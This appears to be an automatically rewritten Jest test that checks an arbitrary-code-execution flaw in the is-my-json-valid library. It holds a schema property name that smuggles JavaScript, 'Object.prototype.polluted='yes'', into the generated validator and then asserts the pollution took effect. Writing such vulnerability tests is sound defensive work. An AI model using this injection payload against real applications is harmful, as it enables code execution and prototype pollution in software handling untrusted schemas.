const v33 = () => {
    const v18 = expect.assertions(2);
    v18;
    const fs = require('fs');
    const validator = require('is-my-json-valid');
    const path = './is-my-json-valid';
    const sleep = require('sleep');
    file_exist = fs.existsSync(path);
    const v19 = {};
    const v20 = v19.polluted;
    const v21 = expect(v20);
    const v22 = v21.toBe(undefined);
    v22;
    const v23 = {};
    v23.required = true;
    v23.type = 'string';
    const v24 = {};
    v24['x[1 + (Object.prototype.polluted=\'yes\')]'] = v23;
    const schema = {};
    schema.type = 'object';
    schema.properties = v24;
    try {
        let validate = validator(schema);
        const v25 = {};
        const v26 = validate(v25);
        v26;
    } catch (e) {
    }
    file_exist = fs.existsSync(path);
    const v27 = {};
    const v28 = v27.polluted;
    const v29 = expect(v28);
    const v30 = v29.toBe('yes');
    v30;
    const v31 = function (err) {
    };
    const v32 = fs.unlink(path, v31);
    v32;
};
const v34 = test('Arbitrary code execution in is-my-json-valid', v33);
v34;